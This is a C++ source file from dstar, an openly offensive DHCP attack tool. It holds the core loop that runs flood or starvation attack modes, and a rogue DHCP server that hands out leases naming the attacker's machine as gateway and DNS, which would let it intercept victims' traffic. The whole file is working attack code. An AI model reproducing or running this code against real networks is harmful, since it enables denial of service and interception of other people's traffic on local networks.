/*
	* dstar
	* Copyright (C) 2017 - 2018 Jacopo De Luca
	*
	* This program is free software: you can redistribute it and/or modify
	* it under the terms of the GNU General Public License as published by
	* the Free Software Foundation, either version 3 of the License, or
	* (at your option) any later version.
	* This program is distributed in the hope that it will be useful,
	* but WITHOUT ANY WARRANTY; without even the implied warranty of
	* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
	* GNU General Public License for more details.
	* You should have received a copy of the GNU General Public License
	* along with this program. If not, see <http://www.gnu.org/licenses/>.
*/

#include <iostream>
#include <cstring>
#include <zconf.h>
#include <DhcpSocket.h>
#include <Core.h>
#include <actions/Starvation.h>
#include <actions/Flood.h>

void Core::addDhcpDefaultOpt(DhcpPacket *message, DhcpSlot *slot, unsigned char type) {
    int op = 0;

    message->options[op++] = DHCP_MESSAGE_TYPE;
    message->options[op++] = 0x01;
    message->options[op++] = type;
    message->options[op] = 0xFF;

    dhcp_append_option(message, DHCP_SERVER_IDENTIFIER, IPADDRSIZE, (unsigned char *) &this->socket.netinfo.ipAddr.ip);
    dhcp_append_option(message, DHCP_REQ_SUBMASK, IPADDRSIZE, (unsigned char *) &this->socket.netinfo.netMask.ip);

    // ROUTER
    if (ip_isempty(&this->options.gateway))
        dhcp_append_option(message, DHCP_REQ_ROUTERS, IPADDRSIZE, (unsigned char *) &this->socket.netinfo.ipAddr.ip);
    else
        dhcp_append_option(message, DHCP_REQ_ROUTERS, IPADDRSIZE, (unsigned char *) &this->options.gateway);

    // PRIMARY DNS
    if (ip_isempty(&this->options.primaryDns))
        dhcp_append_option(message, DHCP_REQ_DNS, IPADDRSIZE, (unsigned char *) &this->socket.netinfo.ipAddr.ip);
    else
        dhcp_append_option(message, DHCP_REQ_DNS, IPADDRSIZE, (unsigned char *) &this->options.primaryDns);

    // LEASE TIME
    op = htonl(slot->lease);
    if (this->options.lease != 0)
        op = htonl(this->options.lease);
    dhcp_append_option(message, DHCP_ADDR_LEASE_TIME, 4, (unsigned char *) &op);
}

void Core::dhcpServer(DhcpPacket *message) {
    DhcpPacket response{};
    PacketInfo pktInfo{};
    DhcpSlot *slot = nullptr;
    netaddr_ip(clientIp);
    int tmp = 0;

    if (dhcp_type_equals(message, DHCP_DISCOVER)) {
        if ((slot = this->pool.getFreeSlot()) == nullptr)
            return;

        slot->xid = message->xid;

        // OFFER
        dhcp_inject_raw((unsigned char *) &response,
                        DHCP_OP_BOOT_REPLY,
                        0,
                        message->xid,
                        0,
                        DHCP_FLAGS_BROADCAST,
                        nullptr,
                        &slot->clientIp,
                        &this->socket.netinfo.ipAddr,
                        nullptr,
                        nullptr,
                        nullptr);
        memcpy(response.chaddr, message->chaddr, ETHHWASIZE);
        this->addDhcpDefaultOpt(&response, slot, DHCP_OFFER);
        // INFO
        pktInfo.ipSrc = this->socket.netinfo.ipAddr;
        pktInfo.ipDst.ip = 0xFFFFFFFF;
        eth_bcast(&pktInfo.phisAddr);
        pktInfo.toServer = false;
        if ((tmp = this->socket.sendDhcpMsg(&response, DHCPPKTSIZE, &pktInfo)) < 0)
            std::cerr << "DHCP server err: " << spark_strerror(tmp) << std::endl;
    } else if (dhcp_type_equals(message, DHCP_REQUEST)) {
        if ((slot = this->pool.getSlotByXid(message->xid)) == nullptr)
            return;

        if (dhcp_get_option_uint(message, 50) != slot->clientIp.ip) {
            std::cerr << "The request id does not match the requested address, DHCP REQUEST ignored!\n";
            slot->xid = 0;
            return;
        }

        if (dhcp_get_option_uint(message, 54) != this->socket.netinfo.ipAddr.ip) {
            slot->xid = 0;
            return;
        }

        slot->assigned = true;

        // ACK
        dhcp_inject_raw((unsigned char *) &response,
                        DHCP_OP_BOOT_REPLY,
                        0,
                        message->xid,
                        0,
                        DHCP_FLAGS_BROADCAST,
                        nullptr,
                        &slot->clientIp,
                        &this->socket.netinfo.ipAddr,
                        nullptr,
                        nullptr,
                        nullptr);
        memcpy(response.chaddr, message->chaddr, ETHHWASIZE);
        this->addDhcpDefaultOpt(&response, slot, DHCP_ACK);
        // INFO
        pktInfo.ipSrc = this->socket.netinfo.ipAddr;
        pktInfo.ipDst.ip = 0xFFFFFFFF;
        eth_bcast(&pktInfo.phisAddr);
        pktInfo.toServer = false;
        if ((tmp = this->socket.sendDhcpMsg(&response, DHCPPKTSIZE, &pktInfo)) < 0)
            std::cerr << "DHCP server err: " << spark_strerror(tmp) << std::endl;
    } else if (dhcp_type_equals(message, DHCP_RELEASE)) {
        clientIp.ip = message->ciaddr;
        this->pool.releaseSlot(&clientIp);
    }
}

void Core::executeActions() {
    unsigned short wtime;

    while (!this->options.stop) {
        this->action->action(&this->socket);
        if ((wtime = this->action->getWaitingTime()) != 0)
            usleep(wtime);
    }
}

void Core::recvDhcp() {
    DhcpPacket packet{};
    PacketInfo pktInfo{};

    while (!this->options.stop) {
        if (this->socket.recvDhcp((unsigned char *) &packet, &pktInfo) == 0)
            continue;

        this->action->recvDhcpMsg(&this->socket, &this->pool, &pktInfo, &packet);

        if (this->options.enableServer)
            this->dhcpServer(&packet);
    }
}

int Core::registerAction() {
    if (this->options.mode & ATKMODE_FLOOD) {
        this->action = new Flood(&this->options);
    } else if (this->options.mode & ATKMODE_STARVATION) {
        this->action = new Starvation(&this->options);
    }
    return this->options.mode;
}

void Core::openSocket() {
    this->socket.openSocket(this->options.iface);

    this->thActions = std::thread(&Core::executeActions, this);

    this->recvDhcp();

    pthread_cancel(this->thActions.native_handle()); // is safe (?.?)
    this->thActions.join();

    if (this->options.releaseOnExit) {
        std::cout << "Releasing addresses...\n";
        this->releasePool();
        std::cout << "All done!\n";
    }
}

void Core::releasePool() {
    DhcpSlot *slot;
    while (!this->pool.empty()) {
        slot = this->pool.popAndErase();
        this->socket.sendDhcpRelease(slot);
        delete slot;
        usleep(5000);
    }
}